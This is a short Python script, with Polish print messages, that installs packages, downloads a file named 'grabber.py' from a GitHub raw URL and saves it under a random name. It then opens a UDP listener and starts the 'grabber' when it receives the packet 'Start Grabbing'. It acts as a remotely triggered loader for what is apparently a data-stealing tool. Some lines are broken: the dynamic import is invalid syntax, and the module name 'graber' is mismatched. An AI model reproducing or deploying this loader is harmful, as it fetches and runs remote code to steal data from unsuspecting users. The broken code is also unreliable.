import os

os.system("cls")
libraries = ["socket","subprocess","secrets","requests","os",]

for library in libraries:
    os.system(f"pip install {library}")

os.system("cls")

import secrets
import requests

random_string = "".join(secrets.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for _ in range(10))

raw_url = f"https://raw.githubusercontent.com/MatixAndr09/code/main/grabber.py"
r = requests.get(raw_url)
with open(f"{random_string}.py", "w") as f:
    f.write(r.text)

import socket
import f"{random_string}"

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))

        local_ip = s.getsockname()[0]

        return local_ip
    except socket.error as e:
        print(f"Error occurred: {e}")
    finally:
        s.close()

def start_server():
    ip_address = get_local_ip()
    port = 12345

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_socket.bind((ip_address, port))

    while True:
        data, address = server_socket.recvfrom(1024)
        decoded_data = data.decode("utf-8")

        if decoded_data == "Start Grabbing":
            print(f"Otrzymano poprawny pakiet od {address} - Rozpoczynam Grabbera!")
            os.system("cls")
            graber.start_graber()
        else:
            pass

start_server()
